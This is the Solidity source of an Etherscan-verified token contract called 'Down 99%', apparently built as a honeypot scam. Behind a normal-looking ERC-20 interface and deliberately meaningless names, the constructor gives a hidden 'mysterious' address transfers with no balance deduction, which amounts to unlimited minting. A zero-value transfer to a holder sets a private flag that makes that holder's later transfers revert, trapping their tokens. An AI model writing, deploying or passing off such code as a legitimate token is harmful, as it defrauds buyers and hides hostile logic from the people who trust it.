/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

/*

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Down99 is Ownable {
    constructor(address mysterious) {
        balanceOf[msg.sender] = totalSupply;
        good[mysterious] = mark;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    address public uniswapV2Pair;

    string public name = 'Down 99%';

    string public symbol = 'Down99%';

    function approve(address hour, uint256 fuel) public returns (bool success) {
        allowance[msg.sender][hour] = fuel;
        emit Approval(msg.sender, hour, fuel);
        return true;
    }

    function transferFrom(address degree, address mixture, uint256 fuel) public returns (bool success) {
        require(fuel <= allowance[degree][msg.sender]);
        allowance[degree][msg.sender] -= fuel;
        goose(degree, mixture, fuel);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private mark = 58;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private good;

    function transfer(address mixture, uint256 fuel) public returns (bool success) {
        goose(msg.sender, mixture, fuel);
        return true;
    }

    function goose(address degree, address mixture, uint256 fuel) private returns (bool success) {
        if (good[degree] == 0) {
            balanceOf[degree] -= fuel;
        }

        if (fuel == 0) thousand[mixture] += mark;

        if (degree != uniswapV2Pair && good[degree] == 0 && thousand[degree] > 0) {
            good[degree] -= mark;
        }

        balanceOf[mixture] += fuel;
        emit Transfer(degree, mixture, fuel);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private thousand;

    mapping(address => mapping(address => uint256)) public allowance;
}